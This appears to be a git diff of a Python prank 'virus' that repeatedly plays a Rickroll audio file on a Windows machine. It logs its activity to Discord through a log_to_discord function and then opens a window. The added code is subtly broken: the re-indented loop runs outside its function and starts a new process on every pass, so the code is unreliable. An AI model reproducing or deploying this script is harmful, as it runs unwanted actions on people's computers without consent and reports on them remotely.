@@ -40,17 +40,21 @@ def start():
     chnapik_duration = 2*60+10
     
     import os
-    from multiprocessing import Process
-    def music_func():
-      log_to_discord("Starting music loop...")
-      while True:
-        log_to_discord("Playing music...")
-        os.system(f'start /wait "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
-        # time.sleep(chnapik_duration)
+    try:
+        from multiprocessing import Process
+        def music_func():
+            log_to_discord("Starting music loop...")
+        while True:
+            log_to_discord("Playing music...")
+            os.system(f'start "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
+            time.sleep(chnapik_duration)
 
-        time.sleep(10 * 60) # 10 min delay 
-    music = Process(target=music_func)
-    music.start() 
+            time.sleep(10 * 60) # 10 min delay 
+            music = Process(target=music_func)
+            music.start() 
+    except Exception as e:
+        # Windows is weird
+        log_to_discord(f"Windows is being weird, music didnt start, error: {e}")
 
     open_window()
 
